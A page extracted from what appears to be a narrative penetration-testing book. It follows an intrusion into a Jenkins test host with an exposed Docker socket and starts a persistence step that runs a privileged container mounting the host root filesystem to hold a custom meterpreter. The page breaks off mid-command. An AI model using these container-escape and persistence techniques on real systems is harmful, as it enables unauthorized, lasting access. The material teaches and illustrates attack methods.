- pgno: 221
  md: 'Container Registry (ECR). We know the account ID 983457354409; we saw it authorized
    in the bucket policy of mxrads-dl. Our hunch was right: it was Gretsch Politico
    after all.


    All the containers found in Listing 12-2 were lifted using a master tag, except
    for one: the app-abtest image ①, which bears the curious tag SUP6541-add-feature-network.


    We might have an idea about what’s going on in this machine, but we still need
    one last piece of information before making a conclusion. Let’s get more information
    using the docker info command to display data about the host:


    ```

    # docker info

    Name: jenkins-slave-4

    Total Memory: 31.859GiB

    Operating System: Ubuntu 16.04.6 LTS

    Server:

    Containers: 546

    Running: 12

    --snip--

    ```


    Hello, Jenkins, our old friend. Now it all makes sense. We can guess that our
    payload is triggered by what we can assume are end-to-end test workloads. The
    job that triggered in this instance probably starts a container that authenticates
    to AWS ECR using the ecr-login.sh script and then lifts a subset of production
    containers, indicated by the master tag—datavalley, 1ibpredict, and the rest—along
    with the experimental Docker image of the service to be tested: ab-test. That
    explains why it has a different tag than all the other containers.


    Exposing the Docker socket in this way is a common practice in test environments,
    where Docker is not so much used for its isolation properties, but rather for
    its packaging features. For example, Crane, a popular Docker orchestration tool
    (https://github.com/michaelsauter/crane/), is used to lift containers along with
    their dependencies. Instead of installing Crane on every single machine, a company
    may package it in a container and pull it at runtime whenever needed.


    From a software vantage point, it’s great. All jobs are using the same version
    of the Crane tool, and the server running the tests becomes irrelevant. From a
    security standpoint, however, this legitimizes the use of Docker-in-Docker tricks
    (Crane runs containers from within its own container), which opens the floodgates
    of hell and beyond.


    # Persisting the Access


    Test jobs can only last so long before being discarded. Let’s transform this ephemeral
    access into a permanent one by running a custom meterpreter on a new container
    we’ll label aws-cli:


    ```

    # docker run \

    --privileged \

    ① -v /:/hostOS \

    ```'
